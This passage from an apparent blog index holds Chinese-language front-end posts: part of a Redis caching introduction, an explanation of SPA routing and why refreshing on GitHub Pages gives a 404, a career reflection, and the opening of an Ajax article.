對應到 http://techbridge.cc 把 key=abc123, value=http://techbridge.cc 寫進資料庫 同上，但是是儲存在 Redis 當有使用者點擊：abc123 這個網址時，先去 Redis 查有沒有這個 key 有的話，redirect 到對應的網址 沒有的話，只好去資料庫查，查完之後記得寫一份到 Redis 若是你的資料有超級多筆，又不想花很多的錢準備一台記憶體很大的 Redis Server（資料庫是用硬碟儲存，Redis 是存在記憶體，以儲存成本來說，資料庫會便宜許多），你可以使用 Redis 的 Expire 這個功能。 當你在儲存資料的時候，你可以新增一個 Expire time 的參數，當這個時間一到之後，這個 key 就會自動被清除。舉例來說，短網址的 expire 可以設定成 7 天，當某個網址 7 天內都沒有被任何使用者訪問的話，就會自動被刪除。 這樣的好處是你可以減少記憶體的使用量，只保持某些「熱資料」會存在 Redis，其他比較冷門、不常被訪問的數據，就存在 Database，等到被訪問的時候再寫到 Redis 即可。 統計系統 其實上面講到的短網址服務，除了縮網址這個功能，還有另一個重點，那就是：統計資料。例如說 Google 短網址，會提供給你：造訪次數、圖表、用什麼裝置等等，這些才是短網址服務的核心。 如果要做這個功能，那你勢必要記錄每一次 Request，或至少要把 Request 的內容（用什麼手機、時間點、IP）記錄下來，才有數據可以給使用者看。 存在 Database，讀取也是每次都從 Database 讀的話，就會造成一些效能上的 issue，例如說每次 refresh 統計頁面，你就必須重新：select conut(*) from short_url where id=&quot;abc123&quot;一次，才能抓到總共有多少人造訪。 還記得我們提過的 INCR 嗎？這不是就派上用場了！可以自己定義 key 的格式，例如說：abc123:visit 代表 abc123 這個短網址的總共造訪次數，接著，只要在每一次的 Request 都執行：INCR abc123:visit，這個 key 裡面就是你要的數字了，以後都從 Redis 讀取就好。 除了這個以外，假設你想要提供「不重複 IP 訪問次數」，前面提到的 Set 就很適合。可以把每一個 Request 的來源 IP 都丟進一個 Set，只要用 SCARD 就可以知道有多少不重複 IP 了，很方便對吧！ 高即時性排名系統 我曾經做過一個專案，需求如下： 中午 12 點開放使用者進入網站，並且回答一題問題 回答完後會看到自己的排名（依答題時間排序），照名次獲得獎品 只有前 300 名有獎品，之後都沒有 可以先想一下有哪些地方會需要跟資料庫溝通 進入網站時，要先檢查是否超過 300 名，有的話提示活動結束（select count(*)…） 接著檢查使用者是否已答題過，已答題過的話就顯示排名（select … where id=…） 若沒答過，顯示答題頁面 答題結束之後，顯示使用者名次（insert into … id=…） 由於這個活動只有前 300 名有獎品，預估使用者有 10000 人的話，可能在 10 秒內這個活動就結束了！ 10 秒內你的資料庫必須「同時承受」這麼多個 query，可能會有點吃不消，而且仔細檢視之後，會發現很多地方其實沒有必要用資料庫來做，或者是說，用 Redis 來做會更好！ 例如說，可以這樣規劃： 用一個 key：isOver 儲存活動是否結束 用 account 當做 key，裡面儲存使用者的名次 上面的流程就可以改寫成： 進入網站時，去 Redis 讀取 isOver，查看活動是否結束 檢查使用者是否答題過，看 Redis 的使用者帳號這個 key 有沒有資料 若沒答過題且答完題，寫入資料庫，並且把名次寫入 Redis 若是這個使用者的排名&gt;=300，設定 isOver = true 原本需要三個對資料庫的操作，現在縮減到只剩下最必要的一個，其他都可以交給 Redis 處理。而且又因為 Redis 是 in-memory 的資料庫，反應速度非常快！再加上我們的 key 並不多（一萬多個 key 而已），用到的記憶體很少。 就這樣，透過 Redis 的幫助，很順利的就可以解決原本資料庫負載太重可能會很慢甚至掛掉的問題。 總結 若是下次你有些專案使用者很多，或是需要很快速的返回資訊，但是又怕資料庫撐不住，不妨想想是不是能夠導入 Redis，或其他也是做快取的 service。其實在很多場合，如果快取運用得宜的話，可以減輕很多資料庫的負擔，同時也加快響應的速度。 若是你對 Redis 很有興趣，可以參考 Redis 設計與實現 這個網站。","link":"/2016/09/29/redis-introduction/"},{"title":"淺談新手在學習 SPA 時的常見問題：以 Router 為例","text":"簡介 近幾年前端框架大放異彩，許多新手才學沒多久的 JavaScript，就直接學習三大框架了（雖然 React 不是框架，但整個生態系其實就跟框架沒兩樣，因此我覺得歸類在框架也不是不行）。 而這三大框架通常都是拿來寫 SPA（Single Page Application）用的，我一直認為在學習這些框架前應該要具備一些基礎知識，尤其是對於前後端的理解，否則一定會遇到很多不知道從何解起的問題。 因此，本文舉出一個我自己曾經碰過，學生也常常跑來問我的問題當作範例，大家也可以先想一下自己能不能回答出這個問題： 假設今天我有個 SPA，搭配某些 router 的 library 來實作路由，所以 /list 會連到列表頁，/about 會到關於我的頁面。 可是奇怪了，當我把 SPA 上傳到 GitHub Pages 之後，首頁是好的，我從首頁進去 /list 也是好的，可是當我在 /list 重新整理的時候，卻顯示 404 not found，這是為什麼呢？ 要回答這個問題，必須先來複習一下前後端相關的網路基礎知識。 動態網頁與靜態網頁 先想一下，你認知中的動態網頁與靜態網頁是什麼？它們的區別又在哪裡？ 當我們在講到動態與靜態時，其實所談到的東西並不是「網頁上的內容」會不會變。而是指「我所請求的網頁是否有被 Server 『處理』過」。這樣定義可能不太精確，但我接下來舉幾個例子你就會懂了。 先舉個最簡單的例子，假設現在有個檔案叫做 a.php，程式碼長這樣： 123&lt;?php echo \"hello!\";?&gt; 今天如果我造訪 a.php，看到的內容就是： 123&lt;?php echo &quot;hello!&quot;;?&gt; 就代表什麼？代表這是個「靜態網頁」，Server 並沒有透過 PHP 相關的程式去處理這隻檔案，而是把這個 a.php 當作「檔案」給傳回來，就是一般俗稱的 static file。 若是我們今天看到的內容是： 1hello! 就代表 Server 把這個 a.php 給執行了，並且把輸出的結果當作 Response 回傳，這樣的網頁就叫做「動態網頁」，雖然內容沒有變，但它確實是動態網頁。 這就是動態跟靜態的區別，事實上跟你看到的內容會不會改變一點關係都沒有。靜態的會把請求的資源直接當作檔案回傳，動態的則是會在 Server 處理過後才把結果當成 Response 回傳。 為了確保你有完全理解這個概念，我們來看底下這個範例，index.html： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; document.writeln(new Date()) &lt;/script&gt;&lt;/html&gt; 請問這是一個動態還是靜態網頁？ 答案是靜態。因為這就是一個靜態的 HTML 檔案，沒有被 Server 特殊處理就直接傳到 Client 端，Client 端看到的就是存放在 Server 的檔案內容。雖然畫面上的資訊會改變沒錯，但我前面說過了，這並不是區分動態或靜態的標準。 談完了動態與靜態之後，我們來談談 Server 處理請求的方式。 Server 與路徑 最常看到的一種網址是什麼？是像檔案那樣子的，例如說 GitHub Pages：http://aszx87410.github.io/mars-lang-chrome-extension/index.html，後半段的 mars-lang-chrome-extension/index.html 就代表在 mars-lang-chrome-extension 這個資料夾底下有 index.html 這個檔案。 這邊的網址某種程度上就反映了真實的檔案路徑，所以存取任何一個頁面就跟存取檔案差不多。但這些其實都是可以透過 Server 更改設定的！ 意思是說，如果我想要的話，我可以讓 https://huli.tw/123 輸出我 Server 上面位於 /data/test.html 的這個檔案，這些都是可以調整的。 所以網址跟真實的檔案路徑可以類似，也可以完全不同，這些都可以在 Server 調整。一般來說最常見的跟檔案相關的 Server 其實有兩種。 第一種就是「完全靜態」的 static file server，指的就是無論任何檔案都不會經過處理，然後會對應到檔案路徑，是什麼檔案就輸出什麼內容。 最經典的範例就是 GitHub Pages，無論你放 PHP、Ruby 還是 JavaScript，它都只會把「檔案內容」一五一十的輸出給你，而不會去執行那個腳本。所以你沒辦法在 GitHub Pages 上面跑任何跟 Server 有關的東西，你沒辦法跑 PHP，沒辦法跑 Rails 也沒辦法跑 Express，因為它不會幫你做任何處理，只會把檔案內容回傳。 第二種則是經典的 Apache Server，通常都是搭配 PHP 來做使用，它會幫你把 PHP 檔案執行過後才把結果回傳；PHP 以外的檔案則是當作靜態檔案，就跟 GitHub Pages 一樣。 回到我們開頭的例子，如果你有個檔案叫做 a.php，內容是： 123&lt;?php echo \"hello!\";?&gt; 若是你把這個檔案放上去 GitHub Pages，你只會看到上面那樣的內容，因為它就只是個檔案。 但如果你把這檔案放到設置好 Apache + PHP 的 Server，你會看到 hello!，因為 Server 先執行過這個 PHP 才把結果輸出。 好，有了這些基礎之後，我們自然可以來解決第一個問題。 假設今天我有個 SPA，搭配某些 router 的 library 來實作路由，所以 /list 會連到列表頁，/about 會到關於我的頁面。 可是奇怪了，當我把 SPA 上傳到 GitHub Pages 之後，首頁是好的，我從首頁進去 /list 也是好的，可是當我在 /list 重新整理的時候，卻顯示 404 not found，這是為什麼呢？ 前面有提到過 GitHub Pages 是完全靜態的 Server，而且網址對應到了真實的檔案路徑，所以當你存取根目錄 / 時，預設的設定本來就會去找 /index.html，因此可以正常存取檔案。 但是當你造訪 /list 時，你的 GitHub 上又沒有 /list/index.html，所以當然顯示 404 not found 了，不是很合理嗎？ 這時候你一定會問： 那為什麼我從首頁進去再進到列表頁就沒問題？ 會問這個問題，就代表你不懂 SPA 的 router 是怎麼做的。 SPA 的 router 實現 還記得 SPA 的定義嗎？Single Page，就代表它永不換頁，永遠都在同一頁上面。 可是如果不能換頁，那網址不就是同一個了嗎？這樣不是很不方便嗎？我只要重新整理，就會回到最初的起點，呆呆地站在鏡子前，又回到了同一個頁面。 那有沒有看起來很像換頁，但又不會真的換頁的方法？ 有！那就是在網址後面加個 #，然後去改變後面的東西！ 舉例來說，原本是 index.html，切換到列表頁就變成 index.html#list，關於我頁面就是 index.html#about，這樣不就好了嗎！ 結果長這樣： 範例在這邊，底下是完整程式碼： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;style&gt; .page &#123; display: none; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav&gt; &lt;a href=\"#home\"&gt;home&lt;/a&gt; | &lt;a href=\"#list\"&gt;list&lt;/a&gt; | &lt;a href=\"#about\"&gt;about&lt;/a&gt; &lt;/nav&gt; &lt;div class=\"page home-page\"&gt;I am homepage&lt;/div&gt; &lt;div class=\"page list-page\"&gt;I am list&lt;/div&gt; &lt;div class=\"page about-page\"&gt;About me &lt;/div&gt; &lt;/body&gt; &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\"&gt;&lt;/script&gt; &lt;script&gt; function changePage(hash) &#123; $('.page').hide() if (hash === '#home') &#123; $('.home-page').show() &#125; else if (hash === '#list') &#123; $('.list-page').show() &#125; else if (hash === '#about') &#123; $('.about-page').show() &#125; &#125; // 初始化 changePage(location.hash) // 每當 hash 變動的時候 window.addEventListener(\"hashchange\", function() &#123; changePage(location.hash) &#125;); &lt;/script&gt;&lt;/html&gt; 利用網址後面加上 # 不會跳頁的方式來辨別現在在哪裡，這就是 react-router 裡面提到的 hashRouter。 可是這樣子網址會變得很醜，而且跟其他人的網址都不一樣，會有 hashtag 出現。有沒有什麼辦法讓 hashtag 不見呢？ 有！那就是利用 HTML5 提供的 History API，就可以用 JavaScript 來操作網址列，但又不會真的換頁了。 在 MDN 下方「pushState() 方法範例」的段落是這樣寫的： 假設 http://mozilla.org/foo.html 執行了下面的 JavaScript： var stateObj = { foo: “bar” }; history.pushState(stateObj, “page 2”, “bar.html”); 這會讓網址列顯示 http://mozilla.org/bar.html，但不會讓瀏覽器去載入 bar.html，甚或去檢查 bar.html 存在與否。 重點來了，就是這一句：「但不會讓瀏覽器去載入 bar.html」，就算網址列有變，只要瀏覽器沒有去載入其他頁面，其實就不叫「換頁」。所以 SPA 從來都不是指說「網址列不能變」，而是不能去載入其他頁面，這點一定要搞清楚。 範例如下： 完整程式碼在這邊： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;style&gt; .page &#123; display: none; &#125; .home-page &#123; display: block; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav&gt; &lt;span onclick=\"changePage('home')\"&gt;home&lt;/span&gt; | &lt;span onclick=\"changePage('list')\"&gt;list&lt;/span&gt; | &lt;span onclick=\"changePage('about')\"&gt;about&lt;/span&gt; &lt;/nav&gt; &lt;div class=\"page home-page\"&gt;I am homepage&lt;/div&gt; &lt;div class=\"page list-page\"&gt;I am list&lt;/div&gt; &lt;div class=\"page about-page\"&gt;About me &lt;/div&gt; &lt;/body&gt; &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\"&gt;&lt;/script&gt; &lt;script&gt; function changePage(page) &#123; $('.page').hide() if (page === 'home') &#123; $('.home-page').show() &#125; else if (page === 'list') &#123; $('.list-page').show() &#125; else if (page === 'about') &#123; $('.about-page').show() &#125; // 精華所在 history.pushState(null, null, page) &#125; &lt;/script&gt;&lt;/html&gt; 在換頁的時候利用 pushState 去改變網址，於是網址就變了，但卻不會真的去載入那個新的頁面，根本就是完美！ 補齊了這些知識之後，我們終於可以來回答第一個問題了。當我們在實作 SPA 時，在前端的換頁使用了 pushState，讓我們利用 JavaScript 來更新網址列卻不會真的載入那個資源。 可是如果我們重新整理呢？那意思就變成是要直接去載入那個資源啊！然後伺服器又沒有那個檔案，所以當然會回傳 404 not found。之所以從首頁進去會可以，是因為從首頁到列表頁，我們只是用 pushState 去改變網址，從 / 改成 /list。 但如果我們直接在 /list 重新整理，就代表瀏覽器會發送 Request 去 /list 要資料，自然就會回傳 404 not found。 那要怎麼解決這個問題呢？在 GitHub Pages 上面可以設定一個自訂的 404 page，你可以把這個 404 page 就設置成是你的 index.html，這樣無論網址是什麼，都會回傳 index.html。 我這邊上傳了一個小小的 demo，程式碼在這邊：https://github.com/aszx87410/spa-problem-demo，其實就是直接把 index.html 的內容複製到 404.html 去而已。 或是也可以參考這個：rafrex/spa-github-pages，採用了不同的方法。 如果是用 nginx 的話，只要讓所有路徑都試試看 index.html 就好： 123location / &#123; try_files $uri /index.html;&#125; Apache 可以參考網路上找到的設定：SPA - Apache, Nginx Configuration for Single Page Application like React.js on a custom path，原理也是把所有路徑都導到 index.html 去。 總結 我自己一開始在接觸這個部分時也是一頭霧水，花了滿多時間去理解到底前後端的 Router 差別在哪裡，發現需要具備一些基礎知識才有辦法解決這個問題。如果你不知道前端 Router 背後是用 History API 實現，自然就會覺得莫名其妙。 而且初學者來說，所有的問題都打結糾纏在一起，很難一條一條去拆開，自然就找不到問題的解答。 希望這一篇能對初學者有些幫助，能確切理解前端 SPA 指的「不換頁」到底是什麼意思，以及背後是透過什麼原理而實現的。","link":"/2019/09/18/spa-common-problem-about-router/"},{"title":"兩年過後，我能夠被稱為資深工程師了嗎？","text":"前言 在兩年前我寫了這篇一個資淺工程師年末的自我省視，內文主要是檢視自己那年學到的東西以及抒發心得感想，並提出一些對於自己職涯發展上的疑問。 標題之所以是打「資淺」工程師，是因為那時覺得連資深的邊都沾不上，所以用了資淺這個字來形容自己。 兩年過去了，職稱從工程師變成資深工程師，甚至還再往上變成了 Front-end Team Lead。雖然職稱本來就不代表一切，但我認為它至少「代表著什麼」，你到了那個位子就必須負起責任，如果覺得自己能力未及，就必須盡力去追趕，直到自己能擔起那個責任為止。 這篇會先回顧我這兩年來的發展，最後再分享一些自己的心得感想。 在這之前一樣先預祝各位讀者新年快樂！ 技術的深度 兩年前我在文中提到自己是一個有廣度沒深度的人，希望自己之後能走得更深一點，把基礎打的更紮實。而這兩年之間的確有朝這個方向邁進，開始發一些比較有深度的技術文章，這些文章的靈感常常來自於工作。 像是在工作時被資安部門警告有 CSRF 漏洞，於是花了點時間研究，並寫下了讓我們來談談 CSRF，也在差不多的時間點發現令我十分不解的 Cookie 問題，誤打誤撞解開後深入研究，理解問題以後寫了我遇過的最難的 Cookie 問題。不同的工作內容也會碰到不同的問題，例如說在做 PWA 時碰到的原來 CORS 沒有我想像中的簡單以及完成 PWA 後的PWA 實戰經驗分享。 除了工作上得到的靈感，自己深深覺得對 JavaScript 的基礎掌握不足，那些常見的面試題我從來沒有搞懂過為什麼。儘管這些在工作上不一定用得到，但如果我想成為資深工程師，我認為那是逃不掉的，是一定要理解的東西。 針對這個部分，我寫的第一篇文章是該來理解 JavaScript 的原型鍊了並且得到滿多好評，再來寫了深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？，把自己對這個議題的意見做了個整理，然後是近期的我知道你懂 hoisting，可是你了解到多深？與所有的函式都是閉包：談 JS 中的作用域與 Closure，把知名的 hoisting 與 closure 都深入研究了一遍。這樣看下來，大概再把 this 寫完（我也有這個計畫要寫）就能把 JavaScript 那些比較常見的基礎給搞定了，再來可能就是型別轉換的一些問題。 除了 JavaScript 以外，也寫了幾篇文章是關於網路跟瀏覽器的，像是給新手看的輕鬆理解 Ajax 與跨來源請求、我以前一直被搞混最後終於弄懂的循序漸進理解 HTTP Cache 機制以及DOM 的事件傳遞機制：捕獲與冒泡，或偶爾研究一下比較新的東西像統一網頁支付介面：Payment Request API。 從 2015 年開始，我的前端開發生涯就一直圍繞著 React 打轉，所以有時候也會寫一些相關的主題像是React 性能優化大挑戰：一次理解 Immutable data 跟 shouldComponentUpdate與淺談 React Fiber 及其對 lifecycles 造成的影響，或是為了要用 redux-observable 而去學 RxJS 最後寫下的希望是最淺顯易懂的 RxJS 教學。 兩年之間寫了二十幾篇文章，要特別感謝 TechBridge 的夥伴們提出一起經營共筆部落格這個 idea，強迫自己一個月一定要寫出一篇文章來。 即使寫了這麼多，我知道還是有很多主題沒有涵蓋到，就算是寫過的主題也不一定已經完全理解，我覺得這是寫作的人要很小心的一個部分（或也可以說是我對自己的提醒），否則一不小心就會變得自大了起來，卻沒意識到這個世界比你想像中大的多。 像是我前幾天看到這篇文章：騰訊前端面試篇（一）分享自己去騰訊面試的心得，裡面問到的有些題目其實我就不會，所以要學的還多著呢。 除了不能自大以外，也要小心不能妄自菲薄，但這超級難，有時候這個點很難抓，要慢慢去找到那個界線。我不會說自己對某個主題理解到百分之百，但也不會說自己完全不理解，畢竟寫了這麼多主題，對寫過的東西還是有一定程度的理解，這點自信還是要有的。 話說還有一個要小心的陷阱，那就是其實很多人都會這些技術，只是沒有 po 文沒有分享而已。我以前曾經認為有些東西找不太到文章是不是沒什麼人會，不是，他們只是沒有分享出來而已，還是有很多人會的。 技術的廣度 兩年前我覺得自己廣度比深度多很多，因此我寫了一大堆文章針對不同的主題深入研究，讓自己對技術的理解變得更深。 那廣度呢？有了深度以後，我對廣度便不是這麼在乎了。我在第一份工作時還沒決定好自己想往哪裡走，因此我用 node.js 寫後端，用 react+redux 寫前端，還用 Java 寫了 Android 的 App。 可是在那之後我變成了專職的前端工程師，因此對後端技術便不是那麼關注，有哪些新的潮流我都不知道，更不用說 mobile 了。還是會維持一些基本的敏感度，例如說知道新出的 Flutter 之類的，但也僅僅知道這個關鍵字而已。 這其實也是我想走的方向，我覺得先廣再深其實是很不錯的一件事，你得先廣才能去找到自己想走的方向，並且也在這段時期累積一些對其他領域的基本理解，接著才走深，去深入理解你選的那個領域。 以我來說，我在廣度時期讓自己理解後端、Mobile 開發或是一點架構層面的東西，這些都對我之後的職涯很有幫助，至少我有基本的概念，不會什麼都不懂。 而現在進入到深度時期，把心力放在 JavaScript、瀏覽器、網路跟 React，其他的便不是那麼關注。 但如果要我挑幾個在這以外想研究一下的主題，我會選 GraphQL 跟 Vue，希望能對這兩個東西有基本的理解。 融會貫通 到了某個時期，會開始能把以前學過的東西融會貫通並且確切的知道其脈絡發展，而我在這兩年間似乎就到了這個時期。 其實以前就有這種能力了，只是在近期變得更明顯而已。掌握了脈絡以後就能夠很清楚地去解釋一項技術的出現以及為什麼要選用這個技術，能夠知道背後的核心思想，經過這樣的思考以後寫出來的東西是不一樣的。 除了技術深度的發展以外，我也會寫一些面向一般大眾的科普文，像是零基礎的小明要如何成為前端工程師？以及跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR，就是自己整理消化以後再產生出來的東西。 我自己認為之所以這些文章底下一片好評，就是因為它有脈絡。技術的發展是有脈絡的，React 會出現一定是為了要解決一些 jQuery 沒辦法解決、Angular 也沒辦法解決的問題，否則我們不需要一個新的技術，而這新技術也不會變得那麼受歡迎。 只要能夠找到那個理由，就能把這些點串起來連成一條線，連多了就變成一個面，成為完整的知識圖譜。 在上面那兩篇文章中我從最陽春的狀態開始一步步往下推，其實就好像數學證明或是邏輯證明那樣，每一步都跟上一步有關，在證明的過程中會變得越來越複雜，但每個步驟都是環環相扣的。 叫一個新手直接去碰 React，就好像直接讓他從證明的第十步開始往下做，他不知道怎麼到這裡來的，也需要花很多時間去研究該怎麼前進到下一步。但如果你讓他從第一步開始，帶他到第二步、第三步這樣一步步證明下去，當到了第十步時，他知道自己為何在這裡，他知道這一步其實是前面十步的累積，這就是有脈絡跟沒有脈絡的差異。 而我的那些文章之所以特別，是因為我帶讀者從第一步開始走，一步步帶著他們到第十步。所以對沒什麼基礎的人來說，不會感到特別困難；對已經有基礎的人來說，會把以前學過的東西全部串起來，有種煥然一新的感覺。 教學 從以前其實就陸陸續續有在做教學，但在今年的一月終於嘗試了自己一直以來想做的事：從零到一培養一個工程師。 總共還做了兩期，計畫詳細內容可參考：程式導師實驗計畫第二期報名簡章，課程大綱也放到了 GitHub 上面，想跟著學的可以自行取用。 目前第二期已經慢慢接近尾聲，但大概要等二月初才比較好評量成效。在教學的過程中我才是學到最多東西的那個人，每次準備教學前我都必須確定自己能完全掌握要講的主題，趁機理解了一些以前很少接觸到的概念，像是資料庫的 View、Stored Procedure 跟 Trigger 以及 ACID。 課綱的部分也是按照我前面所講的脈絡設計而成，但碰到的問題是難度落差有點太大，所以還有滿多需要調整的地方。不過整體而言教的東西我認為是沒什麼問題的，該學的都有學到，而且不只學了工具，也學了原理。 教學是少數我能維持動能並堅持下去的事，雖然是兼職教學，但我自認課程品質不會跟那些全職教學的差到太遠，以一人團隊來說，我覺得做得不錯了。但當然我也不會就停在這裡，畢竟我認為課程永遠都有改善的空間。 教學相關的心得等課程結業後會再寫一篇文，這邊就先簡單帶過了，不然我怕這篇文會變得太長。 溝通 一年前剛接 Front-end Team Lead 的職位時其實戰戰兢兢，那時候主管只是問我有沒有興趣慢慢來試試看，我說可以慢慢試試看，下禮拜我就被拉到這職位了。我原本以為會先跟在主管旁邊見習一下之類的，結果完全沒有。 不過雖然說是 Team Lead，其實更像是 Lead engineer。差異在於前者會更偏向管理職要帶人，後者則是著重在技術面。我覺得以工作內容來說，其實後者更為貼近一點。 我要做的事情就是跟 PM 溝通，每兩週開一次 sprint planning meeting 看要放什麼 ticket 進來。有新的功能時要給 PM 一個大概的時間估計，也要把 ticket 分發給其他同事，決定他們要做哪些事情。 簡單來說我一個人對 PM，其他前端工程師則是負責去解那些 ticket。不過我自己也是要寫 code 啦，但有一部分時間要留給跟 PM 溝通，只要前端有任何問題他們就是找我，我自己認為大概 8 成時間還是寫 code，其他 2 成處理跟專案有關的事情，簡單來說就是要一直溝通。 以前其實就知道自己溝通能力並不差，但這次會覺得緊張是因為要用英文溝通…剛進公司的時候英文能力頗差（現在也沒多好），深怕自己只會一直跳針說：「Sorry, can you repeat again?」。 起初的時候還真的有點溝通問題，但接了這個位子兩三個月以後發現開始慢慢習慣了，開會的時候超級無敵專心聽雖然還是有些單字聽不懂，但一樣抓關鍵字就好了，聽懂七八成基本上就能夠溝通的滿順暢。 除了這個以外，最近幾個月也開始當起面試官。我一直覺得面試對公司來說是一件需要非常注重的事，因為就是公司對外的門面，一場糟糕的面試比一頓難吃的晚餐更為不堪。 對於面試我也還在摸索自己怎樣能夠做得更好，但我謹記前輩說的話，他說面試不是要比誰厲害，而是要去看面試者的優點，去看他是否適合這個位置，是否想要與他共事。如果面試只是想要電人來凸顯自己的優越，那就完全失去意義了。 順帶一提，有些人的履歷真的寫得很不怎麼樣，十年工作經驗卻看不出到底做了什麼事。 所以，我是資深工程師嗎？ 好，回顧了這麼多終於回到了標題。 兩年前那篇我提到了這篇很棒的文章：如何才有資格稱為資深工程師，裡面提供了一些指標可以參考，更貼心地提供了反指標讓大家知道走火入魔是什麼樣子。 經過這兩年的磨練，在前公司獨立完成直播網站的開發，也在此期間加深自己對基礎的理解，對開發新功能的理解從：「不知道自己能否做到」轉變為「做得到，可能需要多少時間」，在自信心上面提昇了不少。 在現在的公司也終於有了更多討論與交流的機會，跟另外兩位前端討論要選哪個 library、coding style 怎麼定、檔案命名規則怎麼定等等，也更頻繁地與 PM 交流，對溝通以及專案管理有了進一步的理解。 這一年來負責公司的四個前端專案，對專案的架構或是使用的技術上也有了不同的理解，做不同的專案的時候都可以觀摩一下別人寫的架構跟程式碼，培養了看到爛 code 就會想順手修掉的習慣，對於重構之前看到有人說了一句很棒的話：「很多工程師都只會重建，而不會重構」，重構應該是漸進的，如果想等到有時間再砍掉重練，那永遠等不到。 應該做的是在修 bug 或是寫新功能時就順手修掉一些，例如說今天改一個購買流程的東西，我就會順手把那部分重構一下，不一定要做到你心中完美的樣子，只要確保比以前的程式碼品質更好就行了，這樣就會越來越好。 而工作以外的時間寫寫 Blog 分享心得，偶爾花個六七小時只為了寫一篇技術文章，大部分的時間則花在教學培訓，成功轉職的學生也印證了課綱的價值，透過教學也把自己的基礎打得更紮實了一點。 兩年前，工作經驗一年半，剛進入第二家公司任職，自認程式寫得不差但基礎不好，經驗也不足，配不上資深這個名字，因此以資淺工程師自稱。 兩年過後，我可以把前端出現的各種工具放到脈絡裡去談，去解釋為什麼會出現，解釋帶來的好處是什麼，也可以說明在專案中應該如何使用；對前端工程師的必備技能也有一定的基礎，可以跟你談 JavaScript 的各種奇怪現象，要談網路談瀏覽器也行；對 PM 提出的需求通常不會擔心做不做得出來，因為知道自己一定行，關注的點反而變成要如何實作才能做的漂亮以及完成所需要的時間；知道工程師除了寫程式以外，還有很多重要的事情要做，像是理解需求、溝通以及思考。 是的，我覺得我是資深工程師了。 認同請按讚，喜歡請分享（開玩笑的）。 接下來呢？ 當你懂的愈多，也會愈知道自己不足的地方在哪裡，還有很多需要磨練的地方，就算是資深工程師，也有 90 分與 60 分的差異，學無止盡，要學的東西還多著，下面整理出幾個我想加強的方向： 第一，JavaScript 我有一定的基礎但還不夠穩，我希望能把這塊再練的穩一點，希望能穩到看任何 JavaScript 相關的文章都很難感到驚訝的程度。 第二，我在測試這方面弱到爆炸，只有 unit test 的經驗，React 裡面要對 component 做測試的話我還是不知道要測什麼，對 end-to-end testing 也沒什麼經驗。我認為測試是邁向下個階段很重要的關鍵，它可以改變你看程式碼的角度，並且讓品質變得更好。 第三，對使用的工具理解還可以再更深一點，希望能花些時間去研究 Vue、React 跟 Redux 的原始碼，去看一下他們是怎麼做的，除此之外，也能夠從裡面學到很多架構與設計方面的知識。 第四，對於一些「基礎」的理解不足，我這邊指的是瀏覽器跟網路。我大概看過瀏覽器渲染的過程，但我覺得對其中的各個環節還不夠理解，網路的話希望能把 HTTP、HTTP2 或是 TCP/IP 這些東西看熟一點。 第五，computer science 的基礎不足，例如作業系統跟計算機組織還有演算法與資料結構，如果想要再往上，這些也是很重要的一部分，想學習的話比較有效的方式應該是直接去找大學開的課程來看，幫助應該滿大。 技術是工程師的根本，不能忘記這點，也千萬不能讓自己的技術荒廢。是因為有了技術能力，我才能走到現在這個位置。 總結 很慶幸自己在兩年前有寫了那篇文章，幫自己做了一個很好的總結，正是因為有把當時的心得留下來，現在才能夠對照自己以前的樣子。 重看了一遍兩年前的那篇回顧，發現自己在觀念上還是差不多的，還是很注重分享，所以這兩年之間從未間斷。對於「痛過才能理解」還是抱持著一樣的想法，也把這些概念變成文章記錄起來，不然每提到一次就要重新再講一次，很不符合工程師的性格，能重構就應該儘早重構。對於廣度與深度的看法，支持先廣再深，因為那樣走過來的我覺得很有幫助；而小公司與大公司的問題，現在還沒進過大公司所以無法體會，可能要再過好一陣子才能跟大家分享這塊的心得。 其實每次在寫這種回顧的時候，都會先感嘆一下時間就這樣過去了，完全沒有意識到已經過了兩年；不過也就是因為這樣，會更讓人期待自己下一次會變成什麼樣子。 就這樣啦，我們兩年後再見！","link":"/2018/12/29/after-two-years-am-i-senior/"},{"title":"輕鬆理解 Ajax 與跨來源請求","text":"前言 一般來說在學習寫網頁的時候，最先碰到的會是 HTML 與 CSS，負責把版面刻出來以及美化版面，當基礎打穩之後，會開始學習 JavaScript，試著做出一點互動性的效果。而「互動」除了使用者跟瀏覽器的互動以外，別忘了還有 Client 端跟 Server 端的互動，也就是必須要學會從瀏覽器用 JavaScript 跟後端 Server 拿資料，否則你的網頁資料都只能是寫死的。 這篇的主要預設讀者是網頁前端的初學者，希望能讓本來不太理解怎麼跟 Server 交換資料或是怎麼串 APi 的讀者看完之後，能夠更了解該怎麼跟後端串接。 先從舉例開始 在開始之前，我們可以先想想一個問題： 為什麼前端必須跟後端交換資料？ 其實這跟你做的網頁類型有關，假如說你今天做的是一個官方網站，很可能整個網站都是靜態的，只要 HTML 跟 CSS 就可以了，並不需要跟後端 Server 拿資料。 那我們先假設今天要做的是一個可以瀏覽現在 Twitch 實況列表的網頁好了，如下圖。 如果這個網頁不跟後端拿資料，就代表說網頁的內容都是固定的，無論什麼時候看都一樣。可是這樣的話就不對了嘛，因為這個網頁的目標是顯示出「現在有在開實況的頻道」，所以內容是會跟著改變的。 既然會跟著改變，就必須不斷的去更新資料，從 Server 那邊拿資料回來，接著在前端處理過後顯示。 已經確認有拿資料的必要性之後，就可以問自己兩個問題： 要跟誰拿資料？ 要怎麼拿資料？ 第一個問題，很明顯的就是跟 Twitch，因為 Twitch 才有你要的這些資料嘛！ 那第二個問題，要怎麼拿資料呢？就必須透過 Twitch API 了。 API 什麼是 API？你可能已經聽過很多次這個名詞，但還是不知道是什麼。先來講講它的全名吧，它的全名是「Application Programming Interface」，中文翻作應用程式介面。 你可能會想說這是什麼鬼東西，怎麼中文英文我都看不懂在幹嘛。但其實這幾個字裡面，最重要的是「介面」兩個字。 